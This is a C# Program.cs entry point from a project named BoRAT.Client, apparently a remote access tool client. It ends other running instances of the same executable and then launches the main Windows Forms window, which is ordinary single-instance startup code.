using System;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;

namespace BoRAT.Client
{
    internal static class Program
    {
        /// <summary>
        ///     The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main()
        {
            Process[] processes = Process.GetProcessesByName(
                System.IO.Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location));

            int currentPID = Process.GetCurrentProcess().Id;

            foreach (Process pr in processes)
            {
                if (pr.Id != currentPID)
                {
                    pr.Kill();
                }
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new frmMain());
        }
    }
}